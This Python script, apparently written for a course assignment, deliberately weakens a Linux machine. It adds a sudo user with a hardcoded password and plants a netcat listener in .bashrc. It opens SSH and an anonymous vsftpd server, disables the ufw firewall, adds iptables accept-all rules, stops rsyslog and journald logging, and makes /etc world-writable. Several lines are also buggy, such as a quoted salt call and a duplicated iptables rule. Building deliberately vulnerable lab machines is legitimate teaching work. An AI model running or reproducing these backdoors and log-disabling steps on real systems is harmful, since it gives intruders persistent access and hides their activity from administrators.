import os
import crypt
import shutil

# Assignment Vulnerability Generation Script in a newly built linux OS


"""------------------------------------1------------------------------------"""
# create a user with sudo permissions
def create_User():
    username = "ninja"
    password = "hidden"
    # documention to find the specific crypt module for the useradd command
    # it stands for salt which is a 2-character string
    # https://www.cs.unb.ca/~bremner/teaching/cs2613/books/python3-doc/library/crypt.html
    salt = "crypt.mksalt(crypt.METHOD_SHA512)"
    encrypt_pass = crypt.crypt(password, salt)
    os.system("useradd -m -s /bin/bash " + username + " -p " + encrypt_pass)
    os.system("usermod -aG sudo " + username)

create_User()


"""------------------------------------2------------------------------------"""
# open port 25000 on target client
def open_Port():
    # create a port and open it
    echo_port="echo \"nc -lp 25000 & \" >> ~/.bashrc"
    os.system(echo_port)

open_Port()


"""------------------------------------3------------------------------------"""
# install SSH and open port just in case firewall is reenabled and you want another option to connect to the target
def ssh_backdoor():
    os.system("apt-get update && apt install openssh-server -y")
    # just incase the firewall is reenabled we add a allow SSH connection rule
    with open('/etc/ssh/sshd_config', 'a+') as ssh_config:
        ssh_config.write("\nPORT 22")
    os.system("systemctl start ssh")
    os.system("systemctl enable ssh")

ssh_backdoor()


"""------------------------------------4------------------------------------"""
# install vsftpd and allow anonymous logins
# https://docs.python.org/3/library/shutil.html
def vsftpd_backdoor():
    os.system("apt-get install vsftpd -y")
    # copy the configuration file that i made to the vsftpd config file
    shutil.copy('vsftpd.conf','/etc/vsftpd.conf')
    os.system("systemctl restart vsftpd.service")
    # all it has is anonymous enabled
    # anon_upload enabled is
    # no anon password 


vsftpd_backdoor()


"""------------------------------------5------------------------------------"""
# make connection slower by adding a delay to outgoing packets
# https://manpages.ubuntu.com/manpages/xenial/man8/tc.8.html
def slow_packet():
    os.system("tc qdisc add dev ens33 root netem delay 200ms")

slow_packet()


"""------------------------------------6------------------------------------"""
# stops the firewall service ufw
def firewall_off():
    os.system("systemctl stop ufw.service")
    os.system("systemctl disable ufw.service")
    # os.system("sudo systemctl mask ufw.service") this makes sure that you cannot start the system at all
    
firewall_off()


"""------------------------------------7------------------------------------"""
# allow all connections from INPUT, FORWARD, OUTPUT 
# this is just incase the firewall is started again.
# https://linux.die.net/man/8/iptables
def iptable_ACCEPT():
    os.system("iptables -I OUTPUT -j ACCEPT")
    os.system("iptables -I FORWARD -j ACCEPT")
    os.system("iptables -I OUTPUT -j ACCEPT")

iptable_ACCEPT()


"""------------------------------------8------------------------------------"""
# disable the rsyslog
def stop_rsyslog():
    os.system("systemctl stop rsyslog.service")
    os.system("systemctl disable rsyslog.service")
  
stop_rsyslog()


"""------------------------------------9------------------------------------"""
# disable the journal -xe on linux
def disable_journal():
    os.system("systemctl stop systemd-journald.service")
    os.system("systemctl disable systemd-journald.service")

disable_journal()


"""------------------------------------10------------------------------------"""
# make the /etc/folder accessible by everyone by using CHMOD
def tree_access():
    os.system("chmod -f -R 000 /etc")
    os.system("chmod -f -R 777 /etc")

tree_access()
